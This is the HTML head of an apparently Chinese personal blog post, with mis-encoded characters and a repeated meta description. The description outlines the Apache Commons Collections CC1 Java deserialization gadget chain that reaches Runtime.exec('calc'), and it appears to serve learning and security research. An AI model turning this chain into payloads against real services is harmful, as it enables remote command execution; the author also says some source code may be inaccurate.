<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CCé“¾è·Ÿè¸ª | starå¾çš„åšå®¢</title><meta name=keywords content="ç½‘ç»œå®‰å…¨,æ¼æ´,æ”»å‡»é“¾"><meta name=description content='ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ï¼Œä»è¿™é‡Œå¼€å§‹&mldr;
å†™åœ¨å‰é¢ï¼šä¸€ä»½å…³äºCC1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®°
åœ¨æ‚¨æ·±å…¥é˜…è¯»æœ¬æ–‡æ¡£ä¹‹å‰ï¼Œç¬”è€…å¸Œæœ›å…ˆåˆ†äº«å‡ ç‚¹è¯´æ˜ï¼š
è¦å®Œå…¨ç†è§£æœ¬æ–‡æ‰€å‰–æçš„è°ƒç”¨é“¾ï¼Œå»ºè®®æ‚¨å¯¹Javaä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µæœ‰ä¸€å®šäº†è§£ï¼Œä¾‹å¦‚ Map æ¥å£ã€æ³¨è§£ï¼ˆAnnotationï¼‰ã€åå°„ï¼ˆReflectionï¼‰ä»¥åŠ HashMap çš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚å°¤å…¶æ˜¯ï¼Œç†è§£ Map ç»“æ„ä¸Javaæ³¨è§£æœºåˆ¶å¦‚ä½•åœ¨æ­¤åœºæ™¯ä¸‹ååŒå·¥ä½œï¼Œå¹¶æœ€ç»ˆä¸ºä½•ä¼šæˆä¸ºè§¦å‘æ¼æ´çš„å…³é”®ï¼Œæ˜¯æŒæ¡æ•´ä¸ªæ”»å‡»é“¾çš„é‡ä¸­ä¹‹é‡ã€‚
æˆ‘æœ¬äººä¹Ÿæ²¡æœ‰ä»äº‹è¿‡Javaå¼€å‘ï¼Œè¯´å®è¯ä¹Ÿæ˜¯ä¸œä¸€æ¦”å¤´è¥¿ä¸€æ£’å­çš„å­¦ä¹ é›¶æ•£çŸ¥è¯†ï¼Œæœ¬æ–‡å¹¶éåŸåˆ›æ€§çš„æ¼æ´ç ”ç©¶ï¼Œå…¶å†…å®¹æ˜¯åœ¨å®‰å…¨é¢†åŸŸå‰è¾ˆä»¬ï¼ˆå¤§ç¥ï¼‰å·²ç»å®Œæ•´æ¢³ç†å‡ºæ”»å‡»é“¾çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¹¶å€ŸåŠ©AIè¾…åŠ©å­¦ä¹ å’Œåˆ†æ(æºç ä¸èƒ½ç¡®ä¿ç™¾åˆ†ç™¾çœŸå®ï¼Œä½†æ˜¯é€»è¾‘ç»è¿‡æˆ‘ç¡®è®¤åº”è¯¥æ²¡é—®é¢˜çš„)ï¼Œå°†æ•´ä¸ªè°ƒç”¨æµç¨‹ä¸€æ­¥æ­¥è·Ÿè¸ªä¸‹æ¥ï¼Œæ—¨åœ¨ç†æ¸…æ¯ä¸€ç¯èŠ‚çš„æ‰§è¡Œé€»è¾‘ä¸å†…åœ¨è”ç³»ã€‚
å› æ­¤ï¼Œè¿™æ›´åƒæ˜¯ä¸€ç¯‡è¯¦ç»†çš„å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè¿‡ç¨‹çš„è®°å½•ã€‚å¸Œæœ›èƒ½å¯¹åŒæ ·åœ¨å­¦ä¹ è·¯ä¸Šçš„æœ‹å‹ä»¬æœ‰æ‰€å¯å‘ï¼Œæ–‡ä¸­è‹¥æœ‰ä»»ä½•ç–æ¼æˆ–ä¸å½“ä¹‹å¤„ï¼Œä¹Ÿæ³è¯·å„ä½ä¸åèµæ•™ã€‚
ä¸€ã€æ ¸å¿ƒæ€æƒ³æ¦‚è¿°
&ldquo;âš ï¸ æœ¬æµ‹è¯•æ–¹æ¡ˆä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ç›®çš„ã€‚ä»»ä½•æœªç»æˆæƒçš„åˆ©ç”¨è¡Œä¸ºå‡è¿åæ³•å¾‹ï¼Œè¯·åŠ¡å¿…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚&rdquo;
ç›®æ ‡ï¼šé€šè¿‡AnnotationInvocationHandlerå’ŒTransformedMapæ„é€ æ¶æ„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
âœï¸æ ¸å¿ƒé€»è¾‘ï¼š

æ”»å‡»è€…ä½¿ç”¨ TransformedMap.decorate() æ–¹æ³•ï¼Œå°†ä¸€ä¸ªåŒ…å«æ¶æ„ ChainedTransformer é“¾çš„ valueTransformer ç»‘å®šåˆ°ä¸€ä¸ªæ™®é€šçš„ HashMap ä¸Šï¼Œæ„é€ å‡ºå…·æœ‰è‡ªåŠ¨è½¬æ¢èƒ½åŠ›çš„æ¶æ„ TransformedMapã€‚
è¯¥ ChainedTransformer é“¾è¢«ç²¾å¿ƒè®¾è®¡ä¸ºä¾æ¬¡æ‰§è¡Œï¼šè·å– Runtime.class â†’ åå°„è°ƒç”¨ getRuntime() â†’ è·å– Runtime å®ä¾‹ â†’ è°ƒç”¨ exec("calc")ï¼Œä»è€Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚
æ”»å‡»è€…é€šè¿‡åå°„åˆ›å»º AnnotationInvocationHandler å®ä¾‹ï¼Œå¹¶å°†ä¸Šè¿°æ¶æ„ TransformedMap ä½œä¸ºå…¶ memberValues å­—æ®µçš„å€¼ï¼Œä½¿è¯¥ handler åœ¨è¯­ä¹‰ä¸Šâ€œçœ‹èµ·æ¥åƒâ€ä¸€ä¸ªåˆæ³•çš„æ³¨è§£ä»£ç†å¯¹è±¡ã€‚
æ”»å‡»è€…å°†æ•´ä¸ª AnnotationInvocationHandler å¯¹è±¡åºåˆ—åŒ–ï¼Œç”Ÿæˆå¯ä¼ è¾“çš„ payloadï¼Œå¹¶å‘é€ç»™å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç›®æ ‡æœåŠ¡ã€‚
ç›®æ ‡æœåŠ¡åœ¨ååºåˆ—åŒ–è¯¥ payload æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ AnnotationInvocationHandler.readObject() æ–¹æ³•ï¼›è¯¥æ–¹æ³•ä¼šéå† memberValues.entrySet()ï¼Œå¹¶å¯¹æ¯ä¸ªæ¡ç›®è¿›è¡Œç±»å‹æ ¡éªŒã€‚
åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒAnnotationInvocationHandler.readObject()ä¼šéå†memberValuesçš„é”®å€¼å¯¹ã€‚å½“å®ƒå°è¯•å°†memberValuesä¸­çš„å€¼è½¬æ¢ä¸ºæ³¨è§£å®šä¹‰çš„ç±»å‹æ—¶ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…ï¼ˆå¦‚Stringè¢«è½¬æ¢ä¸ºIntegerï¼‰ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨entry.setValue(newValue)ï¼Œæ¥æ›´æ–°å€¼ï¼Œå³ä½¿æ–°æ—§å€¼ç›¸åŒã€‚è¿™ä¸ªåŠ¨ä½œæ°å¥½è§¦å‘äº†æˆ‘ä»¬é¢„è®¾çš„é™·é˜±ã€‚
ğŸ’¡ä¸æ‡‚çš„å¼ºçƒˆå»ºè®®å­¦ä¸‹Mapå’Œæ³¨è§£æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå…¶å®æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£è€¦ï¼Œæœ¬äººä¹Ÿæ˜¯Javaå°ç™½
è€Œ TransformedMap é‡å†™äº† entrySet()ï¼Œè¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„ EntrySetViewï¼›å…¶è¿­ä»£å™¨ TransformedMapEntryIterator ä¼šå°†åŸå§‹ Map.Entry åŒ…è£…ä¸º TransformedMapEntryï¼Œå¹¶åœ¨æ„é€ æ—¶ä¿å­˜å¯¹ TransformedMap è‡ªèº«ï¼ˆå³ parentï¼‰çš„å¼•ç”¨ã€‚
å› æ­¤ï¼Œe.setValue(newValue) å®é™…è°ƒç”¨çš„æ˜¯ TransformedMapEntry.setValue()ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè¿›è€Œè§¦å‘ valueTransformer.transform(value)ã€‚
æœ€ç»ˆï¼Œç»‘å®šåœ¨ TransformedMap ä¸­çš„ ChainedTransformer é“¾è¢«æ‰§è¡Œï¼Œå®Œæˆ Runtime.getRuntime().exec("calc") çš„è°ƒç”¨ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚

ğŸ“ æ¼æ´åŸç†"å°ç»“

&ldquo;æ¼æ´æœ¬è´¨ï¼šåˆ©ç”¨JDKååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹AnnotationInvocationHandlerçš„å¤„ç†é€»è¾‘ï¼Œç»“åˆApache Commons Collectionsçš„TransformedMapçš„è‡ªåŠ¨è½¬æ¢ç‰¹æ€§ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚&rdquo;'><meta name=author content="æ‚¨çš„å§“å"><link rel=canonical href=http://ljj1992.fun/posts/cc%E9%93%BE%E8%B7%9F%E8%B8%AA/><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=http://ljj1992.fun/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://ljj1992.fun/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://ljj1992.fun/favicon-32x32.png><link rel=apple-touch-icon href=http://ljj1992.fun/apple-touch-icon.png><link rel=mask-icon href=http://ljj1992.fun/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://ljj1992.fun/posts/cc%E9%93%BE%E8%B7%9F%E8%B8%AA/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://ljj1992.fun/posts/cc%E9%93%BE%E8%B7%9F%E8%B8%AA/"><meta property="og:site_name" content="starå¾çš„åšå®¢"><meta property="og:title" content="CCé“¾è·Ÿè¸ª"><meta property="og:description" content='ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ï¼Œä»è¿™é‡Œå¼€å§‹â€¦ å†™åœ¨å‰é¢ï¼šä¸€ä»½å…³äºCC1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®° åœ¨æ‚¨æ·±å…¥é˜…è¯»æœ¬æ–‡æ¡£ä¹‹å‰ï¼Œç¬”è€…å¸Œæœ›å…ˆåˆ†äº«å‡ ç‚¹è¯´æ˜ï¼š
è¦å®Œå…¨ç†è§£æœ¬æ–‡æ‰€å‰–æçš„è°ƒç”¨é“¾ï¼Œå»ºè®®æ‚¨å¯¹Javaä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µæœ‰ä¸€å®šäº†è§£ï¼Œä¾‹å¦‚ Map æ¥å£ã€æ³¨è§£ï¼ˆAnnotationï¼‰ã€åå°„ï¼ˆReflectionï¼‰ä»¥åŠ HashMap çš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚å°¤å…¶æ˜¯ï¼Œç†è§£ Map ç»“æ„ä¸Javaæ³¨è§£æœºåˆ¶å¦‚ä½•åœ¨æ­¤åœºæ™¯ä¸‹ååŒå·¥ä½œï¼Œå¹¶æœ€ç»ˆä¸ºä½•ä¼šæˆä¸ºè§¦å‘æ¼æ´çš„å…³é”®ï¼Œæ˜¯æŒæ¡æ•´ä¸ªæ”»å‡»é“¾çš„é‡ä¸­ä¹‹é‡ã€‚
æˆ‘æœ¬äººä¹Ÿæ²¡æœ‰ä»äº‹è¿‡Javaå¼€å‘ï¼Œè¯´å®è¯ä¹Ÿæ˜¯ä¸œä¸€æ¦”å¤´è¥¿ä¸€æ£’å­çš„å­¦ä¹ é›¶æ•£çŸ¥è¯†ï¼Œæœ¬æ–‡å¹¶éåŸåˆ›æ€§çš„æ¼æ´ç ”ç©¶ï¼Œå…¶å†…å®¹æ˜¯åœ¨å®‰å…¨é¢†åŸŸå‰è¾ˆä»¬ï¼ˆå¤§ç¥ï¼‰å·²ç»å®Œæ•´æ¢³ç†å‡ºæ”»å‡»é“¾çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¹¶å€ŸåŠ©AIè¾…åŠ©å­¦ä¹ å’Œåˆ†æ(æºç ä¸èƒ½ç¡®ä¿ç™¾åˆ†ç™¾çœŸå®ï¼Œä½†æ˜¯é€»è¾‘ç»è¿‡æˆ‘ç¡®è®¤åº”è¯¥æ²¡é—®é¢˜çš„)ï¼Œå°†æ•´ä¸ªè°ƒç”¨æµç¨‹ä¸€æ­¥æ­¥è·Ÿè¸ªä¸‹æ¥ï¼Œæ—¨åœ¨ç†æ¸…æ¯ä¸€ç¯èŠ‚çš„æ‰§è¡Œé€»è¾‘ä¸å†…åœ¨è”ç³»ã€‚
å› æ­¤ï¼Œè¿™æ›´åƒæ˜¯ä¸€ç¯‡è¯¦ç»†çš„å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè¿‡ç¨‹çš„è®°å½•ã€‚å¸Œæœ›èƒ½å¯¹åŒæ ·åœ¨å­¦ä¹ è·¯ä¸Šçš„æœ‹å‹ä»¬æœ‰æ‰€å¯å‘ï¼Œæ–‡ä¸­è‹¥æœ‰ä»»ä½•ç–æ¼æˆ–ä¸å½“ä¹‹å¤„ï¼Œä¹Ÿæ³è¯·å„ä½ä¸åèµæ•™ã€‚
ä¸€ã€æ ¸å¿ƒæ€æƒ³æ¦‚è¿° â€œâš ï¸ æœ¬æµ‹è¯•æ–¹æ¡ˆä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ç›®çš„ã€‚ä»»ä½•æœªç»æˆæƒçš„åˆ©ç”¨è¡Œä¸ºå‡è¿åæ³•å¾‹ï¼Œè¯·åŠ¡å¿…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚â€
ç›®æ ‡ï¼šé€šè¿‡AnnotationInvocationHandlerå’ŒTransformedMapæ„é€ æ¶æ„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
âœï¸æ ¸å¿ƒé€»è¾‘ï¼š æ”»å‡»è€…ä½¿ç”¨ TransformedMap.decorate() æ–¹æ³•ï¼Œå°†ä¸€ä¸ªåŒ…å«æ¶æ„ ChainedTransformer é“¾çš„ valueTransformer ç»‘å®šåˆ°ä¸€ä¸ªæ™®é€šçš„ HashMap ä¸Šï¼Œæ„é€ å‡ºå…·æœ‰è‡ªåŠ¨è½¬æ¢èƒ½åŠ›çš„æ¶æ„ TransformedMapã€‚ è¯¥ ChainedTransformer é“¾è¢«ç²¾å¿ƒè®¾è®¡ä¸ºä¾æ¬¡æ‰§è¡Œï¼šè·å– Runtime.class â†’ åå°„è°ƒç”¨ getRuntime() â†’ è·å– Runtime å®ä¾‹ â†’ è°ƒç”¨ exec("calc")ï¼Œä»è€Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ æ”»å‡»è€…é€šè¿‡åå°„åˆ›å»º AnnotationInvocationHandler å®ä¾‹ï¼Œå¹¶å°†ä¸Šè¿°æ¶æ„ TransformedMap ä½œä¸ºå…¶ memberValues å­—æ®µçš„å€¼ï¼Œä½¿è¯¥ handler åœ¨è¯­ä¹‰ä¸Šâ€œçœ‹èµ·æ¥åƒâ€ä¸€ä¸ªåˆæ³•çš„æ³¨è§£ä»£ç†å¯¹è±¡ã€‚ æ”»å‡»è€…å°†æ•´ä¸ª AnnotationInvocationHandler å¯¹è±¡åºåˆ—åŒ–ï¼Œç”Ÿæˆå¯ä¼ è¾“çš„ payloadï¼Œå¹¶å‘é€ç»™å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç›®æ ‡æœåŠ¡ã€‚ ç›®æ ‡æœåŠ¡åœ¨ååºåˆ—åŒ–è¯¥ payload æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ AnnotationInvocationHandler.readObject() æ–¹æ³•ï¼›è¯¥æ–¹æ³•ä¼šéå† memberValues.entrySet()ï¼Œå¹¶å¯¹æ¯ä¸ªæ¡ç›®è¿›è¡Œç±»å‹æ ¡éªŒã€‚ åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒAnnotationInvocationHandler.readObject()ä¼šéå†memberValuesçš„é”®å€¼å¯¹ã€‚å½“å®ƒå°è¯•å°†memberValuesä¸­çš„å€¼è½¬æ¢ä¸ºæ³¨è§£å®šä¹‰çš„ç±»å‹æ—¶ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…ï¼ˆå¦‚Stringè¢«è½¬æ¢ä¸ºIntegerï¼‰ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨entry.setValue(newValue)ï¼Œæ¥æ›´æ–°å€¼ï¼Œå³ä½¿æ–°æ—§å€¼ç›¸åŒã€‚è¿™ä¸ªåŠ¨ä½œæ°å¥½è§¦å‘äº†æˆ‘ä»¬é¢„è®¾çš„é™·é˜±ã€‚ ğŸ’¡ä¸æ‡‚çš„å¼ºçƒˆå»ºè®®å­¦ä¸‹Mapå’Œæ³¨è§£æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå…¶å®æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£è€¦ï¼Œæœ¬äººä¹Ÿæ˜¯Javaå°ç™½ è€Œ TransformedMap é‡å†™äº† entrySet()ï¼Œè¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„ EntrySetViewï¼›å…¶è¿­ä»£å™¨ TransformedMapEntryIterator ä¼šå°†åŸå§‹ Map.Entry åŒ…è£…ä¸º TransformedMapEntryï¼Œå¹¶åœ¨æ„é€ æ—¶ä¿å­˜å¯¹ TransformedMap è‡ªèº«ï¼ˆå³ parentï¼‰çš„å¼•ç”¨ã€‚ å› æ­¤ï¼Œe.setValue(newValue) å®é™…è°ƒç”¨çš„æ˜¯ TransformedMapEntry.setValue()ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè¿›è€Œè§¦å‘ valueTransformer.transform(value)ã€‚ æœ€ç»ˆï¼Œç»‘å®šåœ¨ TransformedMap ä¸­çš„ ChainedTransformer é“¾è¢«æ‰§è¡Œï¼Œå®Œæˆ Runtime.getRuntime().exec("calc") çš„è°ƒç”¨ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚ ğŸ“ æ¼æ´åŸç†"å°ç»“ â€œæ¼æ´æœ¬è´¨ï¼šåˆ©ç”¨JDKååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹AnnotationInvocationHandlerçš„å¤„ç†é€»è¾‘ï¼Œç»“åˆApache Commons Collectionsçš„TransformedMapçš„è‡ªåŠ¨è½¬æ¢ç‰¹æ€§ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚â€'><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-13T19:00:00+08:20"><meta property="article:modified_time" content="2025-11-13T19:00:00+08:20"><meta property="article:tag" content="ç½‘ç»œå®‰å…¨"><meta property="article:tag" content="æ¼æ´"><meta property="article:tag" content="æ”»å‡»é“¾"><meta name=twitter:card content="summary"><meta name=twitter:title content="CCé“¾è·Ÿè¸ª"><meta name=twitter:description content='ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ï¼Œä»è¿™é‡Œå¼€å§‹&mldr;
å†™åœ¨å‰é¢ï¼šä¸€ä»½å…³äºCC1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®°
åœ¨æ‚¨æ·±å…¥é˜…è¯»æœ¬æ–‡æ¡£ä¹‹å‰ï¼Œç¬”è€…å¸Œæœ›å…ˆåˆ†äº«å‡ ç‚¹è¯´æ˜ï¼š
è¦å®Œå…¨ç†è§£æœ¬æ–‡æ‰€å‰–æçš„è°ƒç”¨é“¾ï¼Œå»ºè®®æ‚¨å¯¹Javaä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µæœ‰ä¸€å®šäº†è§£ï¼Œä¾‹å¦‚ Map æ¥å£ã€æ³¨è§£ï¼ˆAnnotationï¼‰ã€åå°„ï¼ˆReflectionï¼‰ä»¥åŠ HashMap çš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚å°¤å…¶æ˜¯ï¼Œç†è§£ Map ç»“æ„ä¸Javaæ³¨è§£æœºåˆ¶å¦‚ä½•åœ¨æ­¤åœºæ™¯ä¸‹ååŒå·¥ä½œï¼Œå¹¶æœ€ç»ˆä¸ºä½•ä¼šæˆä¸ºè§¦å‘æ¼æ´çš„å…³é”®ï¼Œæ˜¯æŒæ¡æ•´ä¸ªæ”»å‡»é“¾çš„é‡ä¸­ä¹‹é‡ã€‚
æˆ‘æœ¬äººä¹Ÿæ²¡æœ‰ä»äº‹è¿‡Javaå¼€å‘ï¼Œè¯´å®è¯ä¹Ÿæ˜¯ä¸œä¸€æ¦”å¤´è¥¿ä¸€æ£’å­çš„å­¦ä¹ é›¶æ•£çŸ¥è¯†ï¼Œæœ¬æ–‡å¹¶éåŸåˆ›æ€§çš„æ¼æ´ç ”ç©¶ï¼Œå…¶å†…å®¹æ˜¯åœ¨å®‰å…¨é¢†åŸŸå‰è¾ˆä»¬ï¼ˆå¤§ç¥ï¼‰å·²ç»å®Œæ•´æ¢³ç†å‡ºæ”»å‡»é“¾çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¹¶å€ŸåŠ©AIè¾…åŠ©å­¦ä¹ å’Œåˆ†æ(æºç ä¸èƒ½ç¡®ä¿ç™¾åˆ†ç™¾çœŸå®ï¼Œä½†æ˜¯é€»è¾‘ç»è¿‡æˆ‘ç¡®è®¤åº”è¯¥æ²¡é—®é¢˜çš„)ï¼Œå°†æ•´ä¸ªè°ƒç”¨æµç¨‹ä¸€æ­¥æ­¥è·Ÿè¸ªä¸‹æ¥ï¼Œæ—¨åœ¨ç†æ¸…æ¯ä¸€ç¯èŠ‚çš„æ‰§è¡Œé€»è¾‘ä¸å†…åœ¨è”ç³»ã€‚
å› æ­¤ï¼Œè¿™æ›´åƒæ˜¯ä¸€ç¯‡è¯¦ç»†çš„å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè¿‡ç¨‹çš„è®°å½•ã€‚å¸Œæœ›èƒ½å¯¹åŒæ ·åœ¨å­¦ä¹ è·¯ä¸Šçš„æœ‹å‹ä»¬æœ‰æ‰€å¯å‘ï¼Œæ–‡ä¸­è‹¥æœ‰ä»»ä½•ç–æ¼æˆ–ä¸å½“ä¹‹å¤„ï¼Œä¹Ÿæ³è¯·å„ä½ä¸åèµæ•™ã€‚
ä¸€ã€æ ¸å¿ƒæ€æƒ³æ¦‚è¿°
&ldquo;âš ï¸ æœ¬æµ‹è¯•æ–¹æ¡ˆä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ç›®çš„ã€‚ä»»ä½•æœªç»æˆæƒçš„åˆ©ç”¨è¡Œä¸ºå‡è¿åæ³•å¾‹ï¼Œè¯·åŠ¡å¿…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚&rdquo;
ç›®æ ‡ï¼šé€šè¿‡AnnotationInvocationHandlerå’ŒTransformedMapæ„é€ æ¶æ„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
âœï¸æ ¸å¿ƒé€»è¾‘ï¼š

æ”»å‡»è€…ä½¿ç”¨ TransformedMap.decorate() æ–¹æ³•ï¼Œå°†ä¸€ä¸ªåŒ…å«æ¶æ„ ChainedTransformer é“¾çš„ valueTransformer ç»‘å®šåˆ°ä¸€ä¸ªæ™®é€šçš„ HashMap ä¸Šï¼Œæ„é€ å‡ºå…·æœ‰è‡ªåŠ¨è½¬æ¢èƒ½åŠ›çš„æ¶æ„ TransformedMapã€‚
è¯¥ ChainedTransformer é“¾è¢«ç²¾å¿ƒè®¾è®¡ä¸ºä¾æ¬¡æ‰§è¡Œï¼šè·å– Runtime.class â†’ åå°„è°ƒç”¨ getRuntime() â†’ è·å– Runtime å®ä¾‹ â†’ è°ƒç”¨ exec("calc")ï¼Œä»è€Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚
æ”»å‡»è€…é€šè¿‡åå°„åˆ›å»º AnnotationInvocationHandler å®ä¾‹ï¼Œå¹¶å°†ä¸Šè¿°æ¶æ„ TransformedMap ä½œä¸ºå…¶ memberValues å­—æ®µçš„å€¼ï¼Œä½¿è¯¥ handler åœ¨è¯­ä¹‰ä¸Šâ€œçœ‹èµ·æ¥åƒâ€ä¸€ä¸ªåˆæ³•çš„æ³¨è§£ä»£ç†å¯¹è±¡ã€‚
æ”»å‡»è€…å°†æ•´ä¸ª AnnotationInvocationHandler å¯¹è±¡åºåˆ—åŒ–ï¼Œç”Ÿæˆå¯ä¼ è¾“çš„ payloadï¼Œå¹¶å‘é€ç»™å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç›®æ ‡æœåŠ¡ã€‚
ç›®æ ‡æœåŠ¡åœ¨ååºåˆ—åŒ–è¯¥ payload æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ AnnotationInvocationHandler.readObject() æ–¹æ³•ï¼›è¯¥æ–¹æ³•ä¼šéå† memberValues.entrySet()ï¼Œå¹¶å¯¹æ¯ä¸ªæ¡ç›®è¿›è¡Œç±»å‹æ ¡éªŒã€‚
åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒAnnotationInvocationHandler.readObject()ä¼šéå†memberValuesçš„é”®å€¼å¯¹ã€‚å½“å®ƒå°è¯•å°†memberValuesä¸­çš„å€¼è½¬æ¢ä¸ºæ³¨è§£å®šä¹‰çš„ç±»å‹æ—¶ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…ï¼ˆå¦‚Stringè¢«è½¬æ¢ä¸ºIntegerï¼‰ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨entry.setValue(newValue)ï¼Œæ¥æ›´æ–°å€¼ï¼Œå³ä½¿æ–°æ—§å€¼ç›¸åŒã€‚è¿™ä¸ªåŠ¨ä½œæ°å¥½è§¦å‘äº†æˆ‘ä»¬é¢„è®¾çš„é™·é˜±ã€‚
ğŸ’¡ä¸æ‡‚çš„å¼ºçƒˆå»ºè®®å­¦ä¸‹Mapå’Œæ³¨è§£æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå…¶å®æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£è€¦ï¼Œæœ¬äººä¹Ÿæ˜¯Javaå°ç™½
è€Œ TransformedMap é‡å†™äº† entrySet()ï¼Œè¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„ EntrySetViewï¼›å…¶è¿­ä»£å™¨ TransformedMapEntryIterator ä¼šå°†åŸå§‹ Map.Entry åŒ…è£…ä¸º TransformedMapEntryï¼Œå¹¶åœ¨æ„é€ æ—¶ä¿å­˜å¯¹ TransformedMap è‡ªèº«ï¼ˆå³ parentï¼‰çš„å¼•ç”¨ã€‚
å› æ­¤ï¼Œe.setValue(newValue) å®é™…è°ƒç”¨çš„æ˜¯ TransformedMapEntry.setValue()ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè¿›è€Œè§¦å‘ valueTransformer.transform(value)ã€‚
æœ€ç»ˆï¼Œç»‘å®šåœ¨ TransformedMap ä¸­çš„ ChainedTransformer é“¾è¢«æ‰§è¡Œï¼Œå®Œæˆ Runtime.getRuntime().exec("calc") çš„è°ƒç”¨ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚

ğŸ“ æ¼æ´åŸç†"å°ç»“

